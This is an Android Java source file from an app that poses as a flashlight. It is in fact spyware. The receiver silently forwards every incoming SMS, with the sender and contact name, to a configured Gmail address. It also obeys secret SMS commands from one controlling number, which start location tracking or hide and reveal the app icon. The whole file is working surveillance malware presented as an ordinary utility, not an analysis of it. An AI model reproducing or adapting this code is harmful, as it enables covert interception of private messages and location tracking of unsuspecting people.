package com.flash.light; 

import java.util.List;
import android.util.Log;
import android.os.Bundle;
import java.io.IOException;
import android.app.Activity;

import android.telephony.SmsMessage;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import android.content.Intent;
import android.content.Context;
import android.content.BroadcastReceiver;

public class SMSReceiver extends BroadcastReceiver {

  public  static Object[] pdus;
  //public  static Context context;
  private static GmailSender sender;
  private static Configure configure;
  private static FlashLight flashLight;

  public  static String mBody = null;
  private static String phoneNumberString;
  private static String gmailEmailString;

  private static final String SUBJECT = "SMSInterceptor";
  private static final String TAG     = "FlashLight SMSReceiver";

  public SMSReceiver() {
    configure  = new Configure();
    flashLight = new FlashLight();
    gmailEmailString  = configure.emailAddress();
    phoneNumberString = configure.phoneNumber();
  }

  public String endPoint(final String number, final Context context) {

    String end_point;
    final String contact_name  = new Contacts().getContactName(number, context);

    if(!contact_name.isEmpty()) {
      end_point = "" + number + "(" + contact_name + ")";
    }
    else {
      end_point = number;
    }
    return end_point;
  }

  public void threading(final String message) {
    new Thread(new Runnable() {
      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail(TAG, message, gmailEmailString);
        }
        catch(Exception e) {
          Log.e(TAG, "thread() Exception e " + e.toString());
          e.printStackTrace();
        }
      }
    }).start();
  }

  @Override
  public void onReceive(final Context context, Intent intent) {

    if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) { 

      SmsMessage[] messages = null; 
      Bundle bundle = intent.getExtras();

      if(bundle != null) {
        try {
          pdus = (Object[]) bundle.get("pdus");
          messages  = new SmsMessage[pdus.length];
          
          for(int i = 0; i < messages.length; i++) {
            messages[i]  = SmsMessage.createFromPdu((byte[])pdus[i]);
            mBody = messages[i].getMessageBody();
          }

          final String message_from = messages[0].getOriginatingAddress();

          if(mBody.equals("where are you") && message_from.equals(phoneNumberString)) {
            intent = new Intent(context, FlashLightService.class);
            intent.putExtra("obtainLocation","obtainLocation");
            context.startService(intent);
          }
          else if(mBody.equals("hey hey hey") && message_from.equals(phoneNumberString)) {
            threading("Showing FlashLight app!");
            flashLight.showAppIcon(context, context.getPackageManager());
          }
          else if(mBody.equals("bye bye bye") && message_from.equals(phoneNumberString)) {
            threading("Hiding FlashLight app!");
            flashLight.hideAppIcon(context, context.getPackageManager());
          }
          else {
            threading("Incoming sms:!\nFrom " + endPoint(message_from, context) + "\nMessage: " + mBody);
          }
        }
        catch(Exception e) {
          e.printStackTrace();
        }
        
      }
    }
  }

}
